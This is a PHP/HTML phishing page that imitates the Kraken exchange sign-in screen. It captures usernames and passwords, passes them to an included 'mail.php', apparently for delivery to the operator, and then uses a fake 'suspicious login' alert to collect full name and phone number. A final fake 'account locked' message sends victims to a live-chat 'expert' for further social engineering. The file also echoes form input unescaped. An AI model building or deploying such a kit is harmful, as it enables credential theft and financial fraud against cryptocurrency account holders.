<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to kraken</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.png">
    <link rel="stylesheet" href="assets/css/all.min.css">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <!-- navigation -->
    <nav class="navbar navbar-expand-lg" id="navigation-bar">
        <a class="navbar-brand" href="#">
            <img src="assets/images/logo.png" width="80px">
        </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <i class="fas fa-bars"></i>
        </button>

        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav mr-auto">
                <li class="nav-item active">
                    <a class="nav-link" href="#"></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#"></a>
                </li>

            </ul>
            <form class="form-inline">
                <a class="nav-link" href="#">Sign Up</a>
            </form>
        </div>
    </nav>

    <!-- navigation ends -->

    <!-- form -->

     <?php
     if (isset($_POST['btnLoginMore'])) {
        
        include 'mail.php';
    ?>

            <div class="container-fluid" id="welcome-section">

        <form action="" method="post" style=" margin-top: 20px;">
           <div class="alert mb-4 alert-danger text-center">
                There is a suspicious login attempt from your server
            </div>
        <h2 id="heading">Kindly verify your details <span></span></h2>
          <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

            <div class="form-group">
                <!-- <label>First Name</label> -->
                <input type="text" class="form-control" name="name" 
                    placeholder="Full Name" required>
            </div>

           
            <div class="form-group">
                <!-- <label>Registered Number</label> -->
                <input type="text" class="form-control" placeholder="Phone Number" name="number" required>
            </div>
            
                <button class="btn btn-block btn-primary" name="fromLog" type="submit">Verify </button>
            
        </form>
    
    </div>
    <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>

     <div class="container-fluid" id="middle-error-section">
        
        <form action="" method="post">
            <h2 id="heading">Important Message: <span></span></h2>
           <p>Your account has been <b>temporarily locked</b><br>for security reasons.
               <br>Kindly connect to chat for resolving the issues.</p>
            <div class="form">
                <label>Error CODE: EBRX1:6X76D</label><br>
            </div>
            <div class="calling-number">
                <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
            </div>
           
        </form>
    
    </div>

    <?php } else { ?>

    <div class="container-fluid" id="welcome-section">
        <form action="" method="post">
            <h2>Sign in to Kraken</h2>

            <div class="form-group">
                <!-- <label for="exampleInputEmail1">Username</label> -->
                <input type="text" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp"
                    placeholder="Username" required>
            </div>

            <div class="form-group">
                <!-- <label for="exampleInputPassword1">Password</label> -->
                <input type="password" class="form-control" id="exampleInputPassword1"
                    placeholder="Password" name="password" required>
            </div>

            <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary">Sign In</button>
          
        </form>
       
    </div>
    <?php } ?>

    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/popper.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</body>
</html>